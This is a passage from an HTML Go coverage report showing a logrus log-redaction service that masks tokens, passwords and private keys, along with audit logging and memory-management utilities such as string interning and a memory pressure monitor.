        } else<span class="cov8" title="1"> if config.LogLevel != "" </span><span class="cov8" title="1">{
                level, err = logrus.ParseLevel(config.LogLevel)
                if err != nil </span><span class="cov8" title="1">{
                        return fmt.Errorf("invalid log level %q: %w", config.LogLevel, err)
                }</span>
        } else<span class="cov8" title="1"> {
                level = logrus.InfoLevel // Default level
        }</span>

        <span class="cov8" title="1">logger.SetLevel(level)

        // Install redaction hook for automatic sensitive data protection
        redactionService := NewRedactionService()
        redactionHook := redactionService.CreateHook()
        logger.AddHook(redactionHook)

        // Configure formatter based on JSON output setting
        if config.JSONOutput || config.LogFormat == "json" </span><span class="cov8" title="1">{
                logger.SetFormatter(NewStructuredFormatter())
        }</span> else<span class="cov8" title="1"> {
                // Use default text formatter for human-readable output
                logger.SetFormatter(&amp;logrus.TextFormatter{
                        FullTimestamp: true,
                })
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// WithStandardFields creates a logrus.Entry with correlation ID and component info.
//
// This helper function automatically includes the correlation ID from LogConfig
// and sets up standard fields for consistent logging across components.
func WithStandardFields(logger *logrus.Logger, config *LogConfig, component string) *logrus.Entry <span class="cov8" title="1">{
        fields := logrus.Fields{
                StandardFields.Component: component,
        }

        // Add correlation ID if available
        if config != nil &amp;&amp; config.CorrelationID != "" </span><span class="cov8" title="1">{
                fields[StandardFields.CorrelationID] = config.CorrelationID
        }</span>

        <span class="cov8" title="1">return logger.WithFields(fields)</span>
}
</pre>

		<pre class="file" id="file39" style="display: none">// Package logging provides redaction services for sensitive data protection.
//
// This package implements comprehensive sensitive data redaction to ensure
// that tokens, secrets, passwords, and other confidential information
// never appear in log output. It provides both automatic redaction through
// logrus hooks and manual redaction functions.
//
// Key features include:
// - Comprehensive regex patterns for various secret formats
// - Field name-based detection for sensitive data
// - Automatic logrus hook integration
// - Security audit logging capabilities
// - Pattern-based text redaction
// - Configurable redaction behavior
//
// Security patterns supported:
// - GitHub tokens (ghp_, ghs_, github_pat_, ghr_)
// - Bearer tokens and API keys
// - URL parameters with sensitive data
// - Base64 encoded secrets
// - Environment variables with sensitive names
//
// Usage examples:
//
//        // Create redaction service
//        service := logging.NewRedactionService()
//        text := service.RedactSensitive("token=ghp_1234567890")
//
//        // Use with logrus hook
//        hook := service.CreateHook()
//        logrus.AddHook(hook)
//
//        // Audit logging
//        audit := logging.NewAuditLogger()
//        audit.LogAuthentication("user", "token", true)
//
// Important notes:
// - All redaction is irreversible for security compliance
// - Pattern matching is optimized for performance
// - Redaction preserves partial context for debugging
package logging

import (
        "regexp"
        "strings"
        "time"

        "github.com/sirupsen/logrus"
)

// RedactionService handles comprehensive sensitive data redaction.
//
// This service provides automatic detection and redaction of sensitive
// information including tokens, secrets, passwords, and API keys using
// both regex pattern matching and field name analysis.
type RedactionService struct {
        sensitivePatterns []*regexp.Regexp
        sensitiveFields   []string
}

// NewRedactionService creates a new redaction service with comprehensive patterns.
//
// The service is initialized with a comprehensive set of regex patterns
// for detecting various types of sensitive data and field names that
// commonly contain confidential information.
//
// Returns:
// - RedactionService instance with all security patterns configured
//
// Security Patterns:
// - GitHub personal access tokens (ghp_)
// - GitHub app tokens (ghs_)
// - New GitHub PAT format (github_pat_)
// - GitHub refresh tokens (ghr_)
// - URL parameters with sensitive data
// - Bearer/Token authorization headers
// - Base64 encoded secrets (40+ characters)
func NewRedactionService() *RedactionService <span class="cov8" title="1">{
        return &amp;RedactionService{
                sensitivePatterns: []*regexp.Regexp{
                        // GitHub token patterns (flexible for test tokens)
                        regexp.MustCompile(`ghp_[a-zA-Z0-9]{8,}`),         // GitHub personal tokens (8+ chars for tests)
                        regexp.MustCompile(`ghs_[a-zA-Z0-9]{8,}`),         // GitHub app tokens (8+ chars for tests)
                        regexp.MustCompile(`github_pat_[a-zA-Z0-9_]{8,}`), // New GitHub PAT format (8+ chars for tests)
                        regexp.MustCompile(`ghr_[a-zA-Z0-9]{8,}`),         // GitHub refresh tokens (8+ chars for tests)

                        // Authorization headers - capture just the token part
                        regexp.MustCompile(`(Bearer|Token)\s+([^\s]+)`),

                        // URL parameters - capture key=value pattern
                        regexp.MustCompile(`(password|token|secret|key|api_key)=([^\s&amp;]+)`),

                        // URL passwords - capture :password@ pattern
                        regexp.MustCompile(`://([^:]+):([^@]+)@`),

                        // JWT tokens (three base64 parts separated by dots) - only capture token for JWT prefix
                        regexp.MustCompile(`JWT\s+([a-zA-Z0-9_.-]{20,})`),

                        // Base64 encoded secrets (40+ characters with optional padding) - only standalone
                        regexp.MustCompile(`\b([a-zA-Z0-9+/]{40,}={0,2})\b`),

                        // SSH private key patterns
                        regexp.MustCompile(`-----BEGIN[A-Z\s]+PRIVATE KEY-----[\s\S]*?-----END[A-Z\s]+PRIVATE KEY-----`),

                        // Generic secret patterns in environment variables
                        regexp.MustCompile(`([A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD|PASS)[A-Z_]*=)([^\s]+)`),
                },
                sensitiveFields: []string{
                        // Authentication related
                        "password",
                        "token",
                        "secret",
                        "api_key",
                        "private_key",
                        "gh_token",
                        "github_token",
                        "authorization",
                        "auth",

                        // Credentials
                        "credential",
                        "credentials",
                        "pass",
                        "passwd",
                        "pwd",

                        // Keys and certificates
                        "key",
                        "private",
                        "cert",
                        "certificate",
                        "pem",

                        // OAuth and JWT
                        "oauth",
                        "jwt",
                        "bearer",
                        "refresh_token",
                        "access_token",

                        // Database and connection strings
                        "connection_string",
                        "database_url",
                        "db_password",
                },
        }
}</span>

// RedactSensitive removes sensitive data from text using pattern matching.
//
// This method applies all configured regex patterns to identify and redact
// sensitive information while preserving some context for debugging purposes.
// The redaction maintains partial visibility for troubleshooting while
// ensuring complete security compliance.
//
// Parameters:
// - text: Text content to scan and redact
//
// Returns:
// - Redacted text with sensitive data replaced with secure placeholders
//
// Redaction Strategy:
// - GitHub tokens: Preserve full prefix (e.g., "github_pat_***REDACTED***")
// - Other long matches (&gt; 10 chars): Partial preservation (first 4 chars + "***REDACTED***")
// - Short matches (&lt;= 10 chars): Complete replacement with "***REDACTED***"
// - URL patterns: Parameter values redacted, names preserved
// - Headers: Value redacted, header name preserved
func (r *RedactionService) RedactSensitive(text string) string <span class="cov8" title="1">{
        // GitHub token patterns - preserve full prefix
        githubTokenPatterns := []*regexp.Regexp{
                regexp.MustCompile(`ghp_[a-zA-Z0-9]{4,}`),
                regexp.MustCompile(`ghs_[a-zA-Z0-9]{4,}`),
                regexp.MustCompile(`github_pat_[a-zA-Z0-9_]{4,}`),
                regexp.MustCompile(`ghr_[a-zA-Z0-9]{4,}`),
        }

        for _, pattern := range githubTokenPatterns </span><span class="cov8" title="1">{
                text = pattern.ReplaceAllStringFunc(text, func(match string) string </span><span class="cov8" title="1">{
                        if strings.HasPrefix(match, "ghp_") </span><span class="cov8" title="1">{
                                return "ghp_***REDACTED***"
                        }</span>
                        <span class="cov8" title="1">if strings.HasPrefix(match, "ghs_") </span><span class="cov8" title="1">{
                                return "ghs_***REDACTED***"
                        }</span>
                        <span class="cov8" title="1">if strings.HasPrefix(match, "github_pat_") </span><span class="cov8" title="1">{
                                return "github_pat_***REDACTED***"
                        }</span>
                        <span class="cov0" title="0">if strings.HasPrefix(match, "ghr_") </span><span class="cov0" title="0">{
                                return "ghr_***REDACTED***"
                        }</span>
                        <span class="cov0" title="0">return "***REDACTED***"</span>
                })
        }

        // SSH private keys
        <span class="cov8" title="1">sshPattern := regexp.MustCompile(`-----BEGIN[A-Z\s]+PRIVATE KEY-----[\s\S]*?-----END[A-Z\s]+PRIVATE KEY-----`)
        text = sshPattern.ReplaceAllString(text, "***REDACTED_SSH_KEY***")

        // Authorization headers - preserve header name and Bearer/Token keyword
        authPattern := regexp.MustCompile(`(Bearer|Token)\s+([^\s'\"]+)`)
        text = authPattern.ReplaceAllString(text, "$1 ***REDACTED***")

        // JWT tokens - preserve JWT prefix
        jwtPattern := regexp.MustCompile(`JWT\s+([a-zA-Z0-9_.-]{20,})`)
        text = jwtPattern.ReplaceAllString(text, "JWT ***REDACTED***")

        // Generic tokens (like jwt_token2, api_token, etc)
        genericTokenPattern := regexp.MustCompile(`\b[a-zA-Z_]*token[a-zA-Z0-9_]*\b`)
        text = genericTokenPattern.ReplaceAllStringFunc(text, func(match string) string </span><span class="cov8" title="1">{
                // Don't redact if it's already part of a GitHub token
                if strings.HasPrefix(match, "ghp_") || strings.HasPrefix(match, "ghs_") ||
                        strings.HasPrefix(match, "github_pat_") || strings.HasPrefix(match, "ghr_") </span><span class="cov0" title="0">{
                        return match
                }</span>
                // Don't redact common words that aren't actually tokens
                <span class="cov8" title="1">lower := strings.ToLower(match)
                if lower == "token" || lower == "tokens" </span><span class="cov8" title="1">{
                        return match
                }</span>
                <span class="cov0" title="0">return "***REDACTED***"</span>
        })

        // URL passwords - preserve username
        <span class="cov8" title="1">urlPasswordPattern := regexp.MustCompile(`://([^:]+):([^@]+)@`)
        text = urlPasswordPattern.ReplaceAllString(text, "://$1:***REDACTED***@")

        // URL parameters - preserve parameter name
        urlParamPattern := regexp.MustCompile(`(password|token|secret|key|api_key)=([^\s&amp;]+)`)
        text = urlParamPattern.ReplaceAllString(text, "$1=***REDACTED***")

        // Base64 secrets (standalone)
        base64Pattern := regexp.MustCompile(`\b([a-zA-Z0-9+/]{40,}={0,2})\b`)
        text = base64Pattern.ReplaceAllString(text, "***REDACTED***")

        // Environment variables
        envPattern := regexp.MustCompile(`([A-Z_]*(?:TOKEN|SECRET|KEY|PASSWORD|PASS)[A-Z_]*=)([^\s]+)`)
        text = envPattern.ReplaceAllString(text, "$1***REDACTED***")

        return text</span>
}

// IsSensitiveField checks if a field name indicates sensitive data.
//
// This method analyzes field names to determine if they likely contain
// sensitive information based on common naming patterns and conventions.
//
// Parameters:
// - fieldName: Name of the field to analyze
//
// Returns:
// - true if the field name suggests sensitive content, false otherwise
//
// Detection Strategy:
// - Case-insensitive matching against known sensitive field names
// - Substring matching for compound field names
// - Common variations and abbreviations
func (r *RedactionService) IsSensitiveField(fieldName string) bool <span class="cov8" title="1">{
        fieldLower := strings.ToLower(fieldName)
        for _, sensitive := range r.sensitiveFields </span><span class="cov8" title="1">{
                if strings.Contains(fieldLower, sensitive) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// CreateHook creates a logrus hook for automatic redaction.
//
// This method creates a logrus hook that automatically redacts sensitive
// data from all log entries. It processes both log messages and field
// values to ensure comprehensive protection.
//
// Returns:
// - logrus.Hook instance for automatic redaction integration
//
// Integration:
// - Hook processes all log levels (logrus.AllLevels)
// - Redacts both message content and field values
// - Field name-based detection for automatic redaction
// - Pattern-based content scanning for all string values
func (r *RedactionService) CreateHook() logrus.Hook <span class="cov8" title="1">{
        return &amp;RedactionHook{service: r}
}</span>

// RedactionHook automatically redacts sensitive data in log entries.
//
// This hook integrates with logrus to provide automatic redaction of
// sensitive information in both log messages and field values. It
// processes all log entries before they are written.
type RedactionHook struct {
        service *RedactionService
}

// Levels returns the log levels this hook should process.
//
// Returns:
// - All logrus levels to ensure comprehensive redaction coverage
func (h *RedactionHook) Levels() []logrus.Level <span class="cov8" title="1">{
        return logrus.AllLevels
}</span>

// Fire processes a log entry to redact sensitive information.
//
// This method is called by logrus for each log entry and performs
// comprehensive redaction of both the message content and all field
// values to ensure no sensitive data is logged.
//
// Parameters:
// - entry: logrus.Entry to process for sensitive data
//
// Returns:
// - error if processing fails (always nil in current implementation)
//
// Processing:
// - Redacts the main log message using pattern matching
// - Checks field names for sensitivity indicators
// - Redacts string field values using pattern matching
// - Recursively processes nested maps and interfaces
// - Preserves non-string field values unless field name is sensitive
func (h *RedactionHook) Fire(entry *logrus.Entry) error <span class="cov8" title="1">{
        // Redact the main message content
        entry.Message = h.service.RedactSensitive(entry.Message)

        // Process all fields for sensitive content
        for key, value := range entry.Data </span><span class="cov8" title="1">{
                entry.Data[key] = h.redactValue(key, value)
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// redactValue recursively redacts sensitive data in values
func (h *RedactionHook) redactValue(key string, value interface{}) interface{} <span class="cov8" title="1">{
        // Check if field name indicates sensitive data
        if h.service.IsSensitiveField(key) </span><span class="cov8" title="1">{
                // For sensitive field names, apply pattern-based redaction to strings
                // or complete redaction for non-strings
                if str, ok := value.(string); ok </span><span class="cov8" title="1">{
                        redacted := h.service.RedactSensitive(str)
                        // If pattern-based redaction didn't change anything, apply complete redaction
                        if redacted == str </span><span class="cov8" title="1">{
                                return "***REDACTED***"
                        }</span>
                        <span class="cov8" title="1">return redacted</span>
                }
                <span class="cov8" title="1">return "***REDACTED***"</span>
        }

        // For non-sensitive field names, still process the value
        <span class="cov8" title="1">switch v := value.(type) </span>{
        case string:<span class="cov8" title="1">
                // Apply pattern-based redaction to strings
                return h.service.RedactSensitive(v)</span>
        case map[string]interface{}:<span class="cov8" title="1">
                // Recursively process nested maps
                result := make(map[string]interface{})
                for nestedKey, nestedValue := range v </span><span class="cov8" title="1">{
                        result[nestedKey] = h.redactValue(nestedKey, nestedValue)
                }</span>
                <span class="cov8" title="1">return result</span>
        case []interface{}:<span class="cov8" title="1">
                // Process slices
                result := make([]interface{}, len(v))
                for i, item := range v </span><span class="cov8" title="1">{
                        result[i] = h.redactValue("", item) // Use empty key for array items
                }</span>
                <span class="cov8" title="1">return result</span>
        default:<span class="cov8" title="1">
                // Return other types unchanged
                return value</span>
        }
}

// AuditLogger provides security audit logging capabilities.
//
// This logger tracks security-relevant operations including authentication
// attempts, configuration changes, and repository access for compliance
// and security monitoring purposes.
type AuditLogger struct {
        logger *logrus.Entry
}

// NewAuditLogger creates a new audit logger instance.
//
// The audit logger is configured with appropriate context and formatting
// for security event tracking and compliance requirements.
//
// Returns:
// - AuditLogger instance configured for security event logging
func NewAuditLogger() *AuditLogger <span class="cov8" title="1">{
        return &amp;AuditLogger{
                logger: logrus.WithField(StandardFields.Component, "audit"),
        }
}</span>

// LogAuthentication logs authentication attempts for security monitoring.
//
// This method records authentication events with context including the
// user, authentication method, and success status for security analysis.
//
// Parameters:
// - user: Username or identifier for the authentication attempt
// - method: Authentication method used (e.g., "token", "ssh", "oauth")
// - success: Whether the authentication was successful
//
// Side Effects:
// - Creates INFO level log entry with authentication context
// - Includes timestamp for security event correlation
// - Uses standardized audit event format
func (a *AuditLogger) LogAuthentication(user, method string, success bool) <span class="cov8" title="1">{
        a.logger.WithFields(logrus.Fields{
                "event":   "authentication",
                "user":    user,
                "method":  method,
                "success": success,
                "time":    time.Now().Unix(),
        }).Info("Authentication attempt")
}</span>

// LogConfigChange logs configuration changes for audit compliance.
//
// This method records configuration modifications with context about
// the user making the change and the type of action performed.
//
// Parameters:
// - user: User making the configuration change
// - action: Type of action performed (e.g., "create", "update", "delete")
// - config: Configuration object or description being modified
//
// Side Effects:
// - Creates INFO level log entry with configuration change context
// - Includes timestamp for audit trail continuity
// - Records user and action for accountability
func (a *AuditLogger) LogConfigChange(user, action string, _ interface{}) <span class="cov8" title="1">{
        a.logger.WithFields(logrus.Fields{
                "event":  "config_change",
                "user":   user,
                "action": action,
                "time":   time.Now().Unix(),
        }).Info("Configuration changed")
}</span>

// LogRepositoryAccess logs repository access events for security monitoring.
//
// This method tracks repository access patterns including the user,
// repository, and type of access for security analysis and compliance.
//
// Parameters:
// - user: User accessing the repository
// - repo: Repository being accessed
// - action: Type of access (e.g., "read", "write", "clone", "push")
//
// Side Effects:
// - Creates INFO level log entry with repository access context
// - Includes timestamp for access pattern analysis
// - Records user, repository, and action for security monitoring
func (a *AuditLogger) LogRepositoryAccess(user, repo, action string) <span class="cov8" title="1">{
        a.logger.WithFields(logrus.Fields{
                "event":  "repo_access",
                "user":   user,
                "repo":   repo,
                "action": action,
                "time":   time.Now().Unix(),
        }).Info("Repository accessed")
}</span>
</pre>

		<pre class="file" id="file40" style="display: none">// Package memory provides efficient memory management utilities including string interning, lazy loading, and memory pressure monitoring.
package memory

import (
        "fmt"
        "runtime"
        "sync"
        "sync/atomic"
        "time"
)

// StringIntern provides string interning for repeated values to reduce memory usage
// This is particularly useful for repository names, branch names, and other repeated identifiers
type StringIntern struct {
        mu     sync.RWMutex
        values map[string]string

        // Statistics for monitoring
        stats struct {
                hits    int64 // Cache hits (returned existing interned string)
                misses  int64 // Cache misses (created new interned string)
                evicted int64 // Strings evicted due to size limits
                size    int64 // Current cache size
        }

        maxSize int // Maximum number of strings to intern (0 = unlimited)
}

// DefaultStringInternSize is the default maximum cache size for string interning
const DefaultStringInternSize = 10000

// NewStringIntern creates a new string interning system
func NewStringIntern() *StringIntern <span class="cov8" title="1">{
        return NewStringInternWithSize(DefaultStringInternSize)
}</span>

// NewStringInternWithSize creates a string interning system with a specific max size
func NewStringInternWithSize(maxSize int) *StringIntern <span class="cov8" title="1">{
        return &amp;StringIntern{
                values:  make(map[string]string),
                maxSize: maxSize,
        }
}</span>

// Intern returns a canonical instance of the string, reducing memory usage for duplicates
//
// This function is thread-safe and uses read-write locks for optimal performance.
// Common use cases include repository names, branch names, and file paths that appear frequently.
func (si *StringIntern) Intern(s string) string <span class="cov8" title="1">{
        // Fast path: check if string is already interned (read lock only)
        si.mu.RLock()
        if interned, ok := si.values[s]; ok </span><span class="cov8" title="1">{
                si.mu.RUnlock()
                atomic.AddInt64(&amp;si.stats.hits, 1)
                return interned
        }</span>
        <span class="cov8" title="1">si.mu.RUnlock()

        // Slow path: need to intern the string (write lock required)
        si.mu.Lock()
        defer si.mu.Unlock()

        // Double-check after acquiring write lock (another goroutine might have added it)
        if interned, ok := si.values[s]; ok </span><span class="cov0" title="0">{
                atomic.AddInt64(&amp;si.stats.hits, 1)
                return interned
        }</span>

        // Check if we need to evict old entries due to size limits
        <span class="cov8" title="1">if si.maxSize &gt; 0 &amp;&amp; len(si.values) &gt;= si.maxSize </span><span class="cov8" title="1">{
                si.evictOldest()
        }</span>

        // Intern the string
        <span class="cov8" title="1">si.values[s] = s
        atomic.AddInt64(&amp;si.stats.misses, 1)
        atomic.StoreInt64(&amp;si.stats.size, int64(len(si.values)))

        return s</span>
}

// GetStats returns current string interning statistics
func (si *StringIntern) GetStats() StringInternStats <span class="cov8" title="1">{
        si.mu.RLock()
        defer si.mu.RUnlock()

        return StringInternStats{
                Hits:    atomic.LoadInt64(&amp;si.stats.hits),
                Misses:  atomic.LoadInt64(&amp;si.stats.misses),
                Evicted: atomic.LoadInt64(&amp;si.stats.evicted),
                Size:    atomic.LoadInt64(&amp;si.stats.size),
                MaxSize: int64(si.maxSize),
        }
}</span>

// evictOldest removes approximately 10% of entries to make room for new ones
// This is called when maxSize is reached
func (si *StringIntern) evictOldest() <span class="cov8" title="1">{
        evictCount := maxInt(1, len(si.values)/10) // Remove at least 1, up to 10%
        evicted := 0

        // Simple eviction strategy: remove entries in iteration order
        // This is not LRU but is fast and works well for most use cases
        for key := range si.values </span><span class="cov8" title="1">{
                if evicted &gt;= evictCount </span><span class="cov8" title="1">{
                        break</span>
                }
                <span class="cov8" title="1">delete(si.values, key)
                evicted++</span>
        }

        <span class="cov8" title="1">atomic.AddInt64(&amp;si.stats.evicted, int64(evicted))</span>
}

// StringInternStats contains string interning statistics
type StringInternStats struct {
        Hits    int64 `json:"hits"`     // Number of cache hits
        Misses  int64 `json:"misses"`   // Number of cache misses
        Evicted int64 `json:"evicted"`  // Number of evicted entries
        Size    int64 `json:"size"`     // Current cache size
        MaxSize int64 `json:"max_size"` // Maximum cache size (0 = unlimited)
}

// HitRate calculates the cache hit rate as a percentage
func (sis StringInternStats) HitRate() float64 <span class="cov8" title="1">{
        total := sis.Hits + sis.Misses
        if total == 0 </span><span class="cov8" title="1">{
                return 0
        }</span>
        <span class="cov8" title="1">return float64(sis.Hits) / float64(total) * 100</span>
}

// PreallocateSlice creates a slice with the right capacity to minimize allocations
//
// This function helps optimize memory usage by pre-allocating slices with appropriate
// capacity based on estimated size, reducing the number of grow operations.
//
// Parameters:
// - estimatedSize: Expected number of elements the slice will contain
//
// Returns:
// - Empty slice with capacity set to estimatedSize
//
// Usage Example:
//
//        repos := PreallocateSlice[string](100) // Expect ~100 repository names
//        for _, repo := range repositories {
//            repos = append(repos, repo.Name)
//        }
func PreallocateSlice[T any](estimatedSize int) []T <span class="cov8" title="1">{
        if estimatedSize &lt;= 0 </span><span class="cov8" title="1">{
                return nil
        }</span>
        <span class="cov8" title="1">return make([]T, 0, estimatedSize)</span>
}

// PreallocateMap creates a map with appropriate initial size to minimize allocations
//
// Go maps benefit from having their size hint set during creation to avoid
// multiple rehashing operations as they grow.
//
// Parameters:
// - estimatedSize: Expected number of key-value pairs the map will contain
//
// Returns:
// - Empty map with size hint set to estimatedSize
//
// Usage Example:
//
//        branchMap := PreallocateMap[string, BranchInfo](50) // Expect ~50 branches
//        for _, branch := range branches {
//            branchMap[branch.Name] = branch
//        }
func PreallocateMap[K comparable, V any](estimatedSize int) map[K]V <span class="cov8" title="1">{
        if estimatedSize &lt;= 0 </span><span class="cov8" title="1">{
                return make(map[K]V)
        }</span>
        <span class="cov8" title="1">return make(map[K]V, estimatedSize)</span>
}

// ReuseSlice clears a slice and returns it for reuse, preserving capacity
//
// This function helps reduce garbage collection pressure by reusing existing
// slice backing arrays instead of allocating new ones.
//
// Parameters:
// - slice: Slice to clear and reuse
//
// Returns:
// - The same slice with length 0 but original capacity preserved
//
// Usage Example:
//
//        var fileList []string
//        for batch := range batches {
//            fileList = ReuseSlice(fileList)
//            // ... populate fileList ...
//        }
func ReuseSlice[T any](slice []T) []T <span class="cov8" title="1">{
        return slice[:0]
}</span>

// PressureMonitor tracks memory usage and can trigger alerts when thresholds are exceeded
type PressureMonitor struct {
        mu                 sync.RWMutex
        thresholds         Thresholds
        lastStats          runtime.MemStats
        alertCallback      func(Alert)
        monitoringEnabled  bool
        monitoringInterval time.Duration
        stopChan           chan struct{}

        // Statistics
        alertCount         int64
        highPressureEvents int64
        gcForcedCount      int64
}

// Thresholds defines memory usage thresholds for monitoring
type Thresholds struct {
        HeapAllocMB   uint64 // Alert when heap allocation exceeds this (MB)
        HeapSysMB     uint64 // Alert when heap system memory exceeds this (MB)
        GCPercent     uint64 // Alert when GC percentage exceeds this
        NumGoroutines int    // Alert when goroutine count exceeds this
}

// DefaultThresholds returns sensible defaults for most applications
func DefaultThresholds() Thresholds <span class="cov8" title="1">{
        return Thresholds{
                HeapAllocMB:   100,  // 100MB heap allocation
                HeapSysMB:     200,  // 200MB heap system memory
                GCPercent:     10,   // 10% time spent in GC
                NumGoroutines: 1000, // 1000 goroutines
        }
}</span>

// Alert represents a memory pressure alert
type Alert struct {
        Type      string           `json:"type"`
        Message   string           `json:"message"`
        Timestamp time.Time        `json:"timestamp"`
        Stats     runtime.MemStats `json:"stats"`
        Severity  AlertSeverity    `json:"severity"`
}

// AlertSeverity indicates the severity of a memory alert
type AlertSeverity int

const (
        // AlertInfo indicates an informational memory alert
        AlertInfo AlertSeverity = iota
        // AlertWarning indicates a warning-level memory alert
        AlertWarning
        // AlertCritical indicates a critical memory alert
        AlertCritical
)

// String returns the string representation of AlertSeverity
func (mas AlertSeverity) String() string <span class="cov8" title="1">{
        switch mas </span>{
        case AlertInfo:<span class="cov8" title="1">
                return "INFO"</span>
        case AlertWarning:<span class="cov8" title="1">
                return "WARNING"</span>
        case AlertCritical:<span class="cov8" title="1">
                return "CRITICAL"</span>
        default:<span class="cov8" title="1">
                return "UNKNOWN"</span>
        }
}

// NewPressureMonitor creates a new memory pressure monitor
func NewPressureMonitor(thresholds Thresholds, alertCallback func(Alert)) *PressureMonitor <span class="cov8" title="1">{
        return &amp;PressureMonitor{
                thresholds:         thresholds,
                alertCallback:      alertCallback,
                monitoringInterval: 30 * time.Second, // Default monitoring interval
                stopChan:           make(chan struct{}),
        }
}</span>

// StartMonitoring begins continuous memory monitoring
func (mpm *PressureMonitor) StartMonitoring() <span class="cov8" title="1">{
        mpm.mu.Lock()
        defer mpm.mu.Unlock()

        if mpm.monitoringEnabled </span><span class="cov8" title="1">{
                return // Already monitoring
        }</span>

        // Create a new stop channel for this monitoring session
        <span class="cov8" title="1">stopChan := make(chan struct{})
        mpm.stopChan = stopChan
        mpm.monitoringEnabled = true
        go mpm.monitorLoop(stopChan)</span>
}

// StopMonitoring stops continuous memory monitoring
func (mpm *PressureMonitor) StopMonitoring() <span class="cov8" title="1">{
        mpm.mu.Lock()
        defer mpm.mu.Unlock()

        if !mpm.monitoringEnabled </span><span class="cov8" title="1">{
                return // Not monitoring
        }</span>

        <span class="cov8" title="1">mpm.monitoringEnabled = false

        // Close the current stop channel to signal the monitor loop to stop
        // We need to be careful about the race condition here
        select </span>{
        case &lt;-mpm.stopChan:<span class="cov8" title="1"></span>
                // Channel already closed, nothing to do
        default:<span class="cov8" title="1">
                close(mpm.stopChan)</span>
        }
}

// ForceGC forces garbage collection when memory pressure is high
func (mpm *PressureMonitor) ForceGC() <span class="cov8" title="1">{
        runtime.GC()
        atomic.AddInt64(&amp;mpm.gcForcedCount, 1)
}</span>

// GetCurrentMemStats returns the current memory statistics
func (mpm *PressureMonitor) GetCurrentMemStats() runtime.MemStats <span class="cov8" title="1">{
        mpm.mu.RLock()
        defer mpm.mu.RUnlock()

        return mpm.lastStats
}</span>

// GetMonitorStats returns monitoring statistics
func (mpm *PressureMonitor) GetMonitorStats() MonitorStats <span class="cov8" title="1">{
        mpm.mu.RLock()
        defer mpm.mu.RUnlock()

        return MonitorStats{
                AlertCount:         atomic.LoadInt64(&amp;mpm.alertCount),
                HighPressureEvents: atomic.LoadInt64(&amp;mpm.highPressureEvents),
                GCForcedCount:      atomic.LoadInt64(&amp;mpm.gcForcedCount),
                MonitoringEnabled:  mpm.monitoringEnabled,
        }
}</span>

// monitorLoop runs the continuous monitoring process
func (mpm *PressureMonitor) monitorLoop(stopChan &lt;-chan struct{}) <span class="cov8" title="1">{
        ticker := time.NewTicker(mpm.monitoringInterval)
        defer ticker.Stop()

        for </span><span class="cov8" title="1">{
                select </span>{
                case &lt;-stopChan:<span class="cov8" title="1">
                        return</span>
                case &lt;-ticker.C:<span class="cov0" title="0">
                        mpm.checkMemoryPressure()</span>
                }
        }
}

// checkMemoryPressure examines current memory usage and triggers alerts if needed
func (mpm *PressureMonitor) checkMemoryPressure() <span class="cov8" title="1">{
        var stats runtime.MemStats
        runtime.ReadMemStats(&amp;stats)

        mpm.mu.Lock()
        mpm.lastStats = stats
        mpm.mu.Unlock()

        // Check heap allocation
        heapAllocMB := stats.Alloc / 1024 / 1024
        if heapAllocMB &gt; mpm.thresholds.HeapAllocMB </span><span class="cov0" title="0">{
                alert := Alert{
                        Type:      "heap_alloc",
                        Message:   fmt.Sprintf("Heap allocation (%d MB) exceeds threshold (%d MB)", heapAllocMB, mpm.thresholds.HeapAllocMB),
                        Timestamp: time.Now(),
                        Stats:     stats,
                        Severity:  mpm.calculateSeverity("heap_alloc", float64(heapAllocMB), float64(mpm.thresholds.HeapAllocMB)),
                }
                mpm.sendAlert(alert)
        }</span>

        // Check heap system memory
        <span class="cov8" title="1">heapSysMB := stats.HeapSys / 1024 / 1024
        if heapSysMB &gt; mpm.thresholds.HeapSysMB </span><span class="cov8" title="1">{
                alert := Alert{
                        Type:      "heap_sys",
                        Message:   fmt.Sprintf("Heap system memory (%d MB) exceeds threshold (%d MB)", heapSysMB, mpm.thresholds.HeapSysMB),
                        Timestamp: time.Now(),
                        Stats:     stats,
                        Severity:  mpm.calculateSeverity("heap_sys", float64(heapSysMB), float64(mpm.thresholds.HeapSysMB)),
                }
                mpm.sendAlert(alert)
        }</span>

        // Check goroutine count
        <span class="cov8" title="1">numGoroutines := runtime.NumGoroutine()
        if numGoroutines &gt; mpm.thresholds.NumGoroutines </span><span class="cov8" title="1">{
                alert := Alert{
                        Type:      "goroutines",
                        Message:   fmt.Sprintf("Goroutine count (%d) exceeds threshold (%d)", numGoroutines, mpm.thresholds.NumGoroutines),
                        Timestamp: time.Now(),
                        Stats:     stats,
                        Severity:  mpm.calculateSeverity("goroutines", float64(numGoroutines), float64(mpm.thresholds.NumGoroutines)),
                }
                mpm.sendAlert(alert)
        }</span>
}

// calculateSeverity determines alert severity based on how much the threshold is exceeded
func (mpm *PressureMonitor) calculateSeverity(_ string, actual, threshold float64) AlertSeverity <span class="cov8" title="1">{
        ratio := actual / threshold

        switch </span>{
        case ratio &gt;= 2.0:<span class="cov8" title="1"> // 200% of threshold
                return AlertCritical</span>
        case ratio &gt;= 1.5:<span class="cov8" title="1"> // 150% of threshold
                return AlertWarning</span>
        default:<span class="cov8" title="1">
                return AlertInfo</span>
        }
}

// sendAlert sends an alert through the callback if configured
func (mpm *PressureMonitor) sendAlert(alert Alert) <span class="cov8" title="1">{
        atomic.AddInt64(&amp;mpm.alertCount, 1)

        if alert.Severity &gt;= AlertWarning </span><span class="cov8" title="1">{
                atomic.AddInt64(&amp;mpm.highPressureEvents, 1)
        }</span>

        <span class="cov8" title="1">if mpm.alertCallback != nil </span><span class="cov8" title="1">{
                // Call alert callback in a separate goroutine to avoid blocking monitoring
                go mpm.alertCallback(alert)
        }</span>
}

// MonitorStats contains memory monitoring statistics
type MonitorStats struct {
        AlertCount         int64 `json:"alert_count"`
        HighPressureEvents int64 `json:"high_pressure_events"`
        GCForcedCount      int64 `json:"gc_forced_count"`
        MonitoringEnabled  bool  `json:"monitoring_enabled"`
}

// LazyLoader provides on-demand loading for expensive resources
type LazyLoader[T any] struct {
        mu        sync.RWMutex
        loader    func() (T, error)
        value     T
        loaded    bool
        err       error
        loadCount int64
}

// NewLazyLoader creates a new lazy loader with the given loading function
func NewLazyLoader[T any](loader func() (T, error)) *LazyLoader[T] <span class="cov8" title="1">{
        return &amp;LazyLoader[T]{
                loader: loader,
        }
}</span>

